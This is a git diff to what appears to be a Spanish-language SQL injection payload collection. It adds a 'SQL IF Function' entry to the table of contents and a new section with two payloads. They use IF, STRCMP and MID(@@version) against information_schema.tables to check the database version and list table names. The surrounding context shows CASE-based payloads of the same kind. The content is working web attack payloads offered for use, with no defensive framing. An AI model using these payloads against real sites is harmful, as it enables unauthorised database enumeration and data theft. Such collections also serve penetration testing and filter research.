@@ -50,6 +50,7 @@ La mayoria de los payloads aquí mostrados estan creados o modificados por mi.
         * [Sql inyection payload usando upper + reverse + right + sounds like para extraer información](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like-para-extraer-información)
         * [Sql inyection usando elt, doble Reverse, hex y unhex](#Sql-inyection-usando-elt,-doble-Reverse,-hex-y-unhex)
         * [Sql inyection case](#Sql-inyection-case)
+        * [SQL IF Function](#SQL-IF-Function)
         * [Sql inyection payload usando upper + reverse + right + sounds like](#Sql-inyection-payload-usando-upper-+-reverse-+-right-+-sounds-like)
         * [SQL injection usando doble reverse + right + if statement + HTML injection](#SQL-injection-usando-doble-reverse-+-right-+-if-statement-+-HTML-injection)
         * [Sql inyection usando las funciones HEX-UNHEX](#Sql-inyection-usando-las-funciones-HEX-UNHEX)
@@ -918,6 +919,14 @@ SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>
 SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
 
 SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
+```
+
+### SQL IF Function
+
+```
+SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables
+
+select IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
 ```
 
 ### Sql inyection payload usando upper + reverse + right + sounds like
